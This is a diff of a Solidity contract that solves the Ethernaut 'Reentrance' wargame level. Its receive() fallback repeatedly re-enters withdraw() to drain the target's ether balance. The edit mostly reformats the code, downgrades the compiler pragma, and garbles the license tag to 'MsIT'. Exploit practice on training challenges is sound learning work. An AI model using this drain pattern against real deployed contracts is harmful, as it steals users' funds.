@@ -13,37 +13,37 @@ Tools needed for this level:
         await web3.eth.getBalance(instance)
 */
 
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MsIT
+pragma solidity ^0.6.0;
 
-import "./Reentrance.sol";
+import './Reentrance.sol';
 
 contract RentranceAttack {
-    Reentrance reentrance;
+	Reentrance reentrance;
 
-    // Equal to 1 Finney
-    uint public amount = 0.001 ether;    
-    
-    constructor(address payable reentranceAddress) payable {
-        reentrance = Reentrance(reentranceAddress);
-    }
+	// Equal to 1 Finney
+	uint256 public amount = 0.001 ether;
 
-    function attack() public {
-        // donate any amount of ETH for being able to pass the first
-        // requirement of the withdraw function on Ethernaut's Reentrance: 
-        //     if(balances[msg.sender] >= _amount)
-        reentrance.donate{value:amount}(address(this));
+	constructor(address payable reentranceAddress) public payable {
+		reentrance = Reentrance(reentranceAddress);
+	}
 
-        // Execute the withdraw function
-        reentrance.withdraw(amount); 
-    }
-    
-    // This fallback function makes the re-entrancy attack by re-executing the
-    // withdraw() function on Reentrance contract as long as its balance is 
-    // greater than zero.
-    receive() external payable {
-        if (address(reentrance).balance > 0) {
-            reentrance.withdraw(amount); 
-        }
-    }
+	function attack() public {
+		// donate any amount of ETH for being able to pass the first
+		// requirement of the withdraw function on Ethernaut's Reentrance:
+		//     if(balances[msg.sender] >= _amount)
+		reentrance.donate{value: amount}(address(this));
+
+		// Execute the withdraw function
+		reentrance.withdraw(amount);
+	}
+
+	// This fallback function makes the re-entrancy attack by re-executing the
+	// withdraw() function on Reentrance contract as long as its balance is
+	// greater than zero.
+	receive() external payable {
+		if (address(reentrance).balance > 0) {
+			reentrance.withdraw(amount);
+		}
+	}
 }
